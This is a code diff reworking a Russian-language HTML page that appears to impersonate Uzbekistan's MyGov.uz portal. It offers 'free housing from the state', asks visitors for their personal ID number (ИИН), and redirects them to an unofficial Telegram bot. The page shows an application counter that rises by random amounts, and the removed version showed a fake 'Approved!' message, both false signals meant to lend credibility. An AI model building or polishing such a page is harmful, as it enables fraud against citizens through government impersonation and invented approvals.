@@ -3,16 +3,19 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MyGov.uz — Бесплатное жильё</title>
+  <title>MYGOV.UZ — Бесплатное жильё</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script>
     tailwind.config = {
       theme: {
         extend: {
           colors: {
-            primary: '#1E5F74',
-            secondary: '#E8F0F2',
-            accent: '#34D399',
+            primary: '#0C4B33',
+            accent: '#22C55E',
+            background: '#F9FAFB',
+          },
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
           }
         }
       }
@@ -20,70 +23,100 @@
   </script>
 </head>
 
-<body class="h-full flex bg-gray-50">
+<body class="bg-background min-h-screen flex flex-col">
 
-  <!-- Боковое меню -->
-  <aside class="hidden md:flex md:flex-col w-64 bg-primary text-white h-screen fixed top-0 left-0 shadow-lg">
-    <div class="flex flex-col items-center py-8 space-y-4">
-      <img src="logo.png" alt="Логотип" class="w-20 h-20 rounded bg-white p-2">
-      <h1 class="text-lg font-bold">MyGov.uz</h1>
+  <!-- Хедер -->
+  <header class="bg-white w-full shadow-sm">
+    <div class="max-w-7xl mx-auto flex items-center justify-between p-4">
+      <div class="flex items-center space-x-4">
+        <img src="logo.png" alt="Логотип" class="w-10 h-10">
+        <div>
+          <h1 class="text-lg font-bold text-primary">MYGOV.UZ</h1>
+          <p class="text-xs text-gray-500">Единый портал интерактивных государственных услуг</p>
+        </div>
+      </div>
+      <nav class="hidden md:flex space-x-8 text-gray-700 font-medium">
+        <a href="#">О программе</a>
+        <a href="#">Истории</a>
+        <a href="#">Надёжность</a>
+        <a href="#">FAQ</a>
+        <a href="#">Контакты</a>
+      </nav>
+      <div class="hidden md:flex items-center space-x-2">
+        <button class="px-3 py-1 rounded bg-gray-100 text-xs font-bold text-gray-600">RUS</button>
+        <button class="px-3 py-1 rounded bg-gray-100 text-xs font-bold text-gray-600">EN</button>
+      </div>
     </div>
-    <nav class="flex-1 flex flex-col items-center space-y-6 mt-10">
-      <a href="#" class="hover:text-accent">О программе</a>
-      <a href="#" class="hover:text-accent">Проверка права</a>
-      <a href="#" class="hover:text-accent">Новости</a>
-      <a href="#" class="hover:text-accent">Контакты</a>
-    </nav>
-  </aside>
+  </header>
 
-  <!-- Основной Контент -->
-  <main class="flex-1 md:ml-64 flex flex-col items-center justify-center p-6 space-y-8 min-h-screen">
+  <!-- Основной контент -->
+  <main class="flex flex-1 flex-col lg:flex-row items-center justify-center max-w-7xl mx-auto p-6 lg:p-12 space-y-8 lg:space-y-0 lg:space-x-12">
 
-    <!-- Счётчик -->
-    <div class="bg-accent text-white px-4 py-2 rounded-full text-sm font-semibold">
-      Сегодня оформлено квартир: <span id="counter" class="font-bold">315</span>
+    <!-- Левая часть -->
+    <div class="flex-1 space-y-8">
+      <h2 class="text-4xl font-extrabold text-primary">Бесплатное жильё<br>от государства</h2>
+      <p class="text-gray-600 text-lg">Проверь своё право на получение квартиры онлайн:</p>
+
+      <!-- Форма -->
+      <div class="flex items-center space-x-2">
+        <input id="iinInput" type="text" placeholder="Введите ИИН" class="flex-1 p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-accent">
+        <button onclick="startCheck()" class="px-6 py-3 bg-primary text-white rounded-lg font-bold hover:bg-green-700 transition">Проверить</button>
+      </div>
+
+      <!-- Описание -->
+      <div class="bg-white shadow-md rounded-lg p-4 flex items-center space-x-4">
+        <div class="bg-gray-100 p-2 rounded-lg">
+          <svg class="w-6 h-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+          </svg>
+        </div>
+        <p class="text-gray-700 text-sm">
+          Государственная программа, доступная для граждан в очереди на жильё. Узнай о возможности получения квартиры без бюрократии.
+        </p>
+      </div>
+
+      <!-- Счётчик -->
+      <div class="text-gray-700 text-lg">
+        На текущий момент подано заявок: <span id="counter" class="font-extrabold text-primary">1245719</span>
+      </div>
+
+      <!-- Telegram блок -->
+      <div class="bg-white shadow-md rounded-lg p-6 flex flex-col items-center space-y-4 mt-4">
+        <div class="flex items-center space-x-2">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="w-8 h-8">
+          <p class="text-gray-700 font-medium text-center">Подпишитесь на наш Telegram-канал и будьте в курсе новостей программы!</p>
+        </div>
+        <a href="https://t.me/your_bot" target="_blank" class="bg-primary hover:bg-green-700 text-white font-bold px-6 py-3 rounded-lg transition">Перейти в Telegram</a>
+      </div>
     </div>
 
-    <!-- Центральная карточка -->
-    <div class="bg-white shadow-lg rounded-2xl p-8 max-w-md w-full space-y-6 text-center">
-      <h2 class="text-2xl font-bold text-primary">Проверь своё право на жильё</h2>
-      <p class="text-gray-600">Введите ваш ИИН для бесплатной проверки:</p>
-      <input type="text" id="iinInput" placeholder="Ваш ИИН" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-accent">
-      <button onclick="startCheck()" class="bg-primary hover:bg-accent text-white font-bold py-3 w-full rounded-lg transition">
-        Проверить
-      </button>
-      <div id="loading" class="text-center text-primary mt-2 text-sm"></div>
+    <!-- Правая часть (Картинка) -->
+    <div class="flex-1 hidden lg:flex justify-center">
+      <img src="building.png" alt="Жилой дом" class="max-h-[500px] object-cover rounded-lg shadow-lg">
     </div>
-
-    <!-- Кнопка Telegram -->
-    <a href="https://t.me/your_bot" target="_blank" class="mt-6 bg-accent hover:bg-green-400 text-white font-bold py-3 px-8 rounded-lg transition">
-      Перейти в Telegram-бот
-    </a>
 
   </main>
+
+  <!-- Футер -->
+  <footer class="text-center text-gray-400 text-sm py-6">
+    © 2025 MyGov.uz — Все права защищены
+  </footer>
 
   <!-- Скрипт -->
   <script>
     function startCheck() {
       const iin = document.getElementById('iinInput').value.trim();
-      const loading = document.getElementById('loading');
       if (iin.length < 7) {
-        loading.innerHTML = "<span class='text-red-500'>Введите корректный ИИН</span>";
+        alert('Пожалуйста, введите корректный ИИН.');
         return;
       }
-      loading.innerHTML = "Проверка данных...";
-      setTimeout(() => {
-        loading.innerHTML = "✅ Одобрено! Переход...";
-        setTimeout(() => {
-          window.location.href = "https://t.me/your_bot";
-        }, 1500);
-      }, 2000);
+      window.location.href = "https://t.me/your_bot";
     }
 
-    // Счётчик
-    let counter = document.getElementById('counter');
+    // Динамический счётчик заявок
+    const counterElement = document.getElementById('counter');
     setInterval(() => {
-      counter.innerText = parseInt(counter.innerText) + Math.floor(Math.random() * 3);
+      counterElement.textContent = (parseInt(counterElement.textContent) + Math.floor(Math.random() * 5)).toString();
     }, 5000);
   </script>
 
